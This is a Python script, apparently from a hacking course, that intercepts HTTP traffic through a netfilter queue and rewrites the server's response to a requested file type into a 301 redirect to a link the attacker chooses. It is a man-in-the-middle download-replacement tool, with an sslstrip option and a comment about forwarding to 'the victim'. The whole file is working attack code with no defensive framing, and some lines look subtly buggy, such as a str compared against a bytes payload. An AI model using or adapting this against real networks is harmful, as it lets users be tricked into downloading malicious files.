#!/usr/bin/env python3

from snfq import SNFQ
import scapy.all as scapy
import argparse

ack_list = []


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-e", "--extension", dest="extension", help="Specify a file extension"
    )
    parser.add_argument(
        "-d", "--destination", dest="destination", help="Destination (sslstrip, forward, local)"
    )
    parser.add_argument(
        "-l", "--link", dest="link", help="Specify a replace link"
    )
    values = parser.parse_args()
    if not values.extension:
        parser.error(
            "[-] Please specify a file extension, use --help for more information"
        )
    if not values.destination:
        parser.error(
            "[-] Please specify a destination (sslstrip, forward, local), use --help for more information"
        )
    if not values.link:
        parser.error(
            "[-] Please specify a file extension, use --help for more information"
        )
    return values


def forge_packet(packet, load):
    packet[scapy.Raw].load = load
    # Packet corruption can be detected using the checksum and
    # len fields. By deleting these scapy generates new entries.
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    # Convert the NetfilterQueue packet into a scapy packet.
    scapy_packet = scapy.IP(packet.get_payload())
    # HTTP data is placed in the Raw layer.
    if scapy_packet.haslayer(scapy.Raw):
        # tcp dport = destination (request)
        if scapy_packet[scapy.TCP].dport == 80:
            # If target extension is in the load, wait for
            # the response to the package.
            if options.extension in scapy_packet[scapy.Raw].load:
                print("[+] Extension Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        # tcp sport = source (response)
        elif scapy_packet[scapy.TCP].sport == 80:
            # If it is a response we have been waiting for
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing Files")
                forged_packet = forge_packet(
                    scapy_packet,
                    "HTTP/1.1 301 Moved Permanently\nLocation: {}\n\n".format(options.link)
                )
                # Set the forged scapy packet payload to the
                # NetfilterQueue packet.
                packet.set_payload(bytes(forged_packet))
    # Forward to the victim.
    packet.accept()


options = get_args()
queue = SNFQ(process_packet, destination=options.destination)
